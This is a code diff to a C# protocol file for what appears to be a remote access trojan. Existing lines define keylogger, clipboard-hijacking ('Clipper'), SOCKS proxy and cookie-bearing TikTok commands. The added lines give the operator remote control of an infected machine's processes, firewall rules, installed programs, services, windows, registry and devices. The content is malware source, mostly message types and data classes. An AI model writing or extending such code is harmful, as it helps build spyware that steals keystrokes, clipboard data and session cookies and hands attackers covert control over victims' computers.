@@ -104,10 +104,56 @@ public enum PacketType
     KeyloggerFileContent = 178,  // client→server: {Filename, Content}
     KeyloggerDeleteFile  = 179,  // server→client: {Filename}
 
+    // Hardware Stats (sent periodically by client alongside heartbeat)
+    HardwareStats = 36,   // client→server: {CpuUsage, RamUsed, RamTotal}
+
     // Process Manager
-    ProcGetList   = 190,  // server→client: request process list
-    ProcListResult = 191, // client→server: [{Pid, Name, Memory, Title, ExePath}]
-    ProcKill      = 192,  // server→client: {Pid}
+    ProcGetList    = 190,  // server→client: request process list
+    ProcListResult = 191,  // client→server: [{Pid, Name, Memory, CpuUsage, Title, ExePath}]
+    ProcKill       = 192,  // server→client: {Pid}
+    ProcSuspend    = 193,  // server→client: {Pid}
+    ProcResume     = 194,  // server→client: {Pid}
+
+    // TCP Firewall
+    TcpFirewallBlock       = 113,  // server→client: {ProcessName, Port, Direction}
+    TcpFirewallUnblock     = 114,  // server→client: {RuleName}
+    TcpFirewallListRules   = 115,  // server→client: request rules
+    TcpFirewallRulesResult = 116,  // client→server: rules list
+
+    // Installed Programs
+    InstalledGetList    = 230,  // server→client: request list
+    InstalledListResult = 231,  // client→server: list of apps
+    InstalledUninstall  = 232,  // server→client: {UninstallString}
+
+    // Service Manager
+    SvcGetList    = 240,  // server→client: request services
+    SvcListResult = 241,  // client→server: list
+    SvcStart      = 242,  // server→client: {ServiceName}
+    SvcStop       = 243,  // server→client: {ServiceName}
+    SvcRestart    = 244,  // server→client: {ServiceName}
+    SvcDisable    = 245,  // server→client: {ServiceName}
+    SvcDelete     = 246,  // server→client: {ServiceName}
+    SvcAck        = 247,  // client→server: {Success, Error}
+
+    // Window Manager
+    WinGetList    = 250,  // server→client: request windows
+    WinListResult = 251,  // client→server: [{Handle, Title, ClassName, Pid, Visible}]
+    WinAction     = 252,  // server→client: {Handle, Action}
+
+    // Registry Editor
+    RegGetChildren    = 260,  // server→client: {KeyPath}
+    RegChildrenResult = 261,  // client→server: {Keys, Values}
+    RegSetValue       = 262,  // server→client: {KeyPath, Name, ValueType, Data}
+    RegDeleteValue    = 263,  // server→client: {KeyPath, Name}
+    RegDeleteKey      = 264,  // server→client: {KeyPath}
+    RegCreateKey      = 265,  // server→client: {KeyPath}
+    RegAck            = 266,  // client→server: {Success, Error}
+
+    // Device Manager
+    DevGetList    = 270,  // server→client: request devices
+    DevListResult = 271,  // client→server: list
+    DevUninstall  = 272,  // server→client: {DeviceId}
+    DevAck        = 273,  // client→server: {Success, Error}
 
     // TikTok
     TikTokComment      = 210,  // server→client: {VideoId, Text, Cookie}
@@ -383,14 +429,17 @@ public class SocksConnResult { public string SessionId { get; set; } = ""; publi
 // ── Process Manager ──────────────────────────────────
 public class ProcEntry
 {
-    public int    Pid     { get; set; }
-    public string Name    { get; set; } = string.Empty;
-    public long   Memory  { get; set; }  // KB
-    public string Title   { get; set; } = string.Empty;
-    public string ExePath { get; set; } = string.Empty;
+    public int    Pid      { get; set; }
+    public string Name     { get; set; } = string.Empty;
+    public long   Memory   { get; set; }  // KB
+    public float  CpuUsage { get; set; }
+    public string Title    { get; set; } = string.Empty;
+    public string ExePath  { get; set; } = string.Empty;
 }
-public class ProcListResultData { public List<ProcEntry> Processes { get; set; } = []; }
-public class ProcKillData       { public int Pid { get; set; } }
+public class ProcListResultData  { public List<ProcEntry> Processes { get; set; } = []; }
+public class ProcKillData        { public int Pid { get; set; } }
+public class ProcSuspendData2    { public int Pid { get; set; } }
+public class ProcResumeData2     { public int Pid { get; set; } }
 
 // ── Keylogger ─────────────────────────────────────────
 public class KeyloggerLogsResultData
@@ -448,4 +497,108 @@ public class ClipperDetectedData
     public string Original { get; set; } = string.Empty;
     public string Replaced { get; set; } = string.Empty;
 }
+
+// ── Hardware Stats ────────────────────────────────────
+public class HardwareStatsData
+{
+    public float  CpuUsage  { get; set; }   // 0-100 %
+    public long   RamUsed   { get; set; }   // MB
+    public long   RamTotal  { get; set; }   // MB
+}
+
+// ── Process Manager (extended) ────────────────────────
+public class ProcSuspendData { public int Pid { get; set; } }
+public class ProcResumeData  { public int Pid { get; set; } }
+
+// ── TCP Firewall ──────────────────────────────────────
+public class TcpFirewallBlockData
+{
+    public string ProcessName { get; set; } = string.Empty;
+    public int    Port        { get; set; }
+    public string Direction   { get; set; } = "both"; // in/out/both
+}
+public class TcpFirewallUnblockData { public string RuleName { get; set; } = string.Empty; }
+public class TcpFirewallRule
+{
+    public string RuleName    { get; set; } = string.Empty;
+    public string ProcessName { get; set; } = string.Empty;
+    public int    Port        { get; set; }
+    public string Direction   { get; set; } = string.Empty;
+}
+public class TcpFirewallRulesResultData { public List<TcpFirewallRule> Rules { get; set; } = []; }
+
+// ── Installed Programs ────────────────────────────────
+public class InstalledApp
+{
+    public string Name            { get; set; } = string.Empty;
+    public string Version         { get; set; } = string.Empty;
+    public string Publisher       { get; set; } = string.Empty;
+    public string InstallDate     { get; set; } = string.Empty;
+    public string UninstallString { get; set; } = string.Empty;
+}
+public class InstalledListResultData { public List<InstalledApp> Apps { get; set; } = []; }
+public class InstalledUninstallData  { public string UninstallString { get; set; } = string.Empty; }
+
+// ── Service Manager ───────────────────────────────────
+public class ServiceEntry
+{
+    public string Name        { get; set; } = string.Empty;
+    public string DisplayName { get; set; } = string.Empty;
+    public string Status      { get; set; } = string.Empty;  // Running/Stopped/Paused
+    public string StartType   { get; set; } = string.Empty;  // Auto/Manual/Disabled
+    public string Description { get; set; } = string.Empty;
+}
+public class SvcListResultData  { public List<ServiceEntry> Services { get; set; } = []; }
+public class SvcActionData      { public string ServiceName { get; set; } = string.Empty; }
+public class SvcAckData         { public bool Success { get; set; } public string Error { get; set; } = string.Empty; }
+
+// ── Window Manager ────────────────────────────────────
+public class WindowEntry
+{
+    public long   Handle    { get; set; }
+    public string Title     { get; set; } = string.Empty;
+    public string ClassName { get; set; } = string.Empty;
+    public int    Pid       { get; set; }
+    public bool   Visible   { get; set; }
+}
+public class WinListResultData { public List<WindowEntry> Windows { get; set; } = []; }
+public class WinActionData
+{
+    public long   Handle { get; set; }
+    public string Action { get; set; } = string.Empty;  // show/hide/close/kill/focus/restore/minimize/maximize
+}
+
+// ── Registry Editor ───────────────────────────────────
+public class RegValue
+{
+    public string Name      { get; set; } = string.Empty;
+    public string ValueType { get; set; } = string.Empty;  // REG_SZ, REG_DWORD, REG_BINARY, etc.
+    public string Data      { get; set; } = string.Empty;
+}
+public class RegChildrenResultData
+{
+    public string       KeyPath  { get; set; } = string.Empty;
+    public List<string> SubKeys  { get; set; } = [];
+    public List<RegValue> Values { get; set; } = [];
+    public string       Error    { get; set; } = string.Empty;
+}
+public class RegGetChildrenData  { public string KeyPath { get; set; } = string.Empty; }
+public class RegSetValueData     { public string KeyPath { get; set; } = string.Empty; public string Name { get; set; } = string.Empty; public string ValueType { get; set; } = "REG_SZ"; public string Data { get; set; } = string.Empty; }
+public class RegDeleteValueData  { public string KeyPath { get; set; } = string.Empty; public string Name { get; set; } = string.Empty; }
+public class RegDeleteKeyData    { public string KeyPath { get; set; } = string.Empty; }
+public class RegCreateKeyData    { public string KeyPath { get; set; } = string.Empty; }
+public class RegAckData          { public bool Success { get; set; } public string Error { get; set; } = string.Empty; }
+
+// ── Device Manager ────────────────────────────────────
+public class DeviceEntry
+{
+    public string DeviceId    { get; set; } = string.Empty;
+    public string Name        { get; set; } = string.Empty;
+    public string Class       { get; set; } = string.Empty;
+    public string Status      { get; set; } = string.Empty;
+    public string Manufacturer{ get; set; } = string.Empty;
+}
+public class DevListResultData  { public List<DeviceEntry> Devices { get; set; } = []; }
+public class DevUninstallData   { public string DeviceId { get; set; } = string.Empty; }
+public class DevAckData         { public bool Success { get; set; } public string Error { get; set; } = string.Empty; }
 
